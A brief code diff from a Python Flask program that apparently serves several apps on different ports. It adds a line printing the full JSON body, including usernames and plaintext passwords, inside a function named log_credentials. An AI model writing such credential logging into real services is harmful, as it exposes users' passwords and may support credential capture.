@@ -347,6 +347,7 @@ for port, app in apps.items():
     def log_credentials():
         try:
                 data = request.get_json()
+                print(f"Output to log : {data}")
                 if not data or 'username' not in data or 'password' not in data:
                     return jsonify({'status': 'error', 'message': 'Invalid request data'}), 400
                 
